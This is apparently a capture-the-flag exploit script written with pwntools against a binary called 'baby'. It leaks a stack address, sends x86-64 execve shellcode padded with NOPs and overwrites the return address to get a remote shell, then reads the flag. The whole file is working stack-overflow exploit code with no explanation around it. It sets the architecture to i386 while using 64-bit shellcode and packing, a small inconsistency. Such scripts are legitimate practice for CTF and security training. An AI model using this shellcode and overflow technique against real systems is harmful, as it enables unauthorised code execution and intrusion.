from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./baby"
HOST = "142.93.113.134"
PORT = 9999 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

#elf = ELF(FILE_NAME)
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
#libc_binsh = next(libc.search("/bin/sh"))

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

def exploit():
	bufsize = 0x80 + 8
	conn.recvuntil("? ")
	stack = int(conn.recvline(), 16)
	
	payload = shellcode
	payload += "\x90"*(bufsize - len(payload))
	payload += p64(stack)
	conn.sendline(payload)
	conn.sendline("cat flag")
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
